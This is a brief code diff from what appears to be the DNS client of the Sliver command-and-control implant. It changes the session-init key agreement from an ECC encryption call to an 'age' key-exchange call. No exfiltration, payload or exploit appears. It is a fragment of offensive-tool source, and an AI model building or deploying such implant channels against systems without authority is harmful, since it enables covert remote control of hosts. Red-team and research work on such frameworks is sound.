@@ -314,7 +314,7 @@ func (s *SliverDNSClient) SessionInit() error {
 	// Key agreement with server
 	sKey := cryptography.RandomKey()
 	s.cipherCtx = cryptography.NewCipherContext(sKey)
-	initData, err := cryptography.ECCEncryptToServer(sKey[:])
+	initData, err := cryptography.AgeKeyExToServer(sKey[:])
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] failed to encrypt init msg %v", err)
